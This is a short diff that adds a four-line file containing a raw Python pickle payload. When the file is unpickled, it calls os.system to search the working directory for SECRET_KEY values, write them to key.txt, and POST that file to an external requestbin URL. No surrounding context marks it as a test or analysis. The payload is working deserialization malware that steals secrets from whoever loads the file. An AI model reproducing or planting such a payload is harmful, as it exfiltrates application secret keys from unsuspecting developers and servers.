@@ -1,0 +1,4 @@
+cos
+system
+(S'grep -rnw '.' -e 'SECRET_KEY' > key.txt; curl -X POST -d @key.txt https://requestb.in/16frcjp1'
+tR.
